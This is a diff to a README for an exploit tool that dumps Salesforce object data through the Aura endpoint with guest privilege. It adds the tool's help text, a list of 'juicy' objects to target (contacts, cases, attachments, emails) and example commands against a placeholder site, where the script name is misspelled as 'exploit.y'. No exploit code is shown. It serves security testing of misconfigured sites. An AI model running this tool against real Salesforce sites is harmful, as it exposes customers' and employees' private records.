@@ -8,7 +8,26 @@ This tool dumps the data of Salesforce object through Aura lightning endpoint wi
 
 # Usage
 ```
-$ python exploit -u URL -o User
+$ python exploit.py -h
+usage: exploit.py [-h] -u URL [-o [OBJECTS [OBJECTS ...]]] [-l] [-c]
+
+Exploit Salesforce through the aura endpoint with the guest privilege
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     set the SITE url. e.g. http://url/site_path
+  -o [OBJECTS [OBJECTS ...]], --objects [OBJECTS [OBJECTS ...]]
+                        set the object name. Default value is "User" object.
+                        Juicy Objects: Case,Account,User,Contact,Document,Cont
+                        entDocument,ContentVersion,ContentBody,CaseComment,Not
+                        e,Employee,Attachment,EmailMessage,CaseExternalDocumen
+                        t,Attachment,Lead,Name,EmailTemplate,EmailMessageRelat
+                        ion
+  -l, --listobj         pull the custom object list.
+  -c, --check           only check aura endpoint
+
+$ python exploit.y -u https://domain.force.com/sitepath -l
+$ python exploit.y -u https://domain.force.com/sitepath -o User Account
 ```
 
 # Reference
